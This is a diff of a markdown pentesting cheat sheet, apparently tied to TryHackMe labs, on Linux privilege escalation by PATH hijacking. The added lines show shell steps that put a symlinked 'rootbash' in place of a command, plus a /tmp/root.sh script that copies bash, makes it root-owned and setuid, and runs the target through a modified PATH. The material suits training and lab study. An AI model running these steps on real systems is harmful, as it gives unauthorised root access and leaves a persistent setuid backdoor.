@@ -18,22 +18,49 @@ There are basic scenarios in which you can directly exploit the executable, but 
 
 <hr class="sep-both">
 
-## Environment variables 🌸
-
-<div class="row row-cols-lg-2"><div>
-
-#### PATH
+## Path Environment variable 🌸
 
 [![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
 [![linuxprivesc](../../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
 [![commonlinuxprivesc](../../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
+[![mustacchio](../../../_badges/thm-p/mustacchio.svg)](https://tryhackme.com/room/mustacchio)
 
-If a script uses the command `ls` and the environment variable `PATH` with the value `/tmp:[...]`, as you can write in `/tmp`, you can create an executable named `ls` which is actually a `bash`. 
+<div class="row row-cols-lg-2"><div>
 
-When the target script is executed, the `bash` command is executed instead of `ls`.
+If you can run a script, you may try to see if the script uses your PATH to work. The easiest way to test that is to empty your PATH.
 
-➡️ If you are the one running the script, you can also change your own PATH to avoid loading the original binary.
+```shell!
+$ bash -c 'export PATH=; <execute the script>'
+"xxx" command not found ====> OK!
+```
+
+⚠️ If you are not able to edit the PATH, try to see if you can write files in a folder in the PATH that is before the original folder.
+
+You can then try to replace the command binary by a [rootbash](rootbash.md). 
+
+```
+$ ls /tmp/rootbash # assuming you created your rootbash
+$ ln -s /tmp/rootbash # replace the command "xxx"
+$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
+<your bash is called>
+```
 </div><div>
+
+Unfortunately, this doesn't work when the command is invoked with some options, such as `tail -f /var/log/nginx/access.log`.
+
+The trick is to create a script that launches our command:
+
+```shell!
+$ cat /tmp/root.sh
+cp /bin/bash /tmp/rootbash
+chown root /tmp/rootbash
+chmod +s /tmp/rootbash
+exit 0
+$ chmod +x /tmp/root.sh 
+$ ln -s /tmp/root.sh /tmp/xxx # your command
+$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
+<your bash is called>
+```
 </div></div>
 
 <hr class="sep-both">
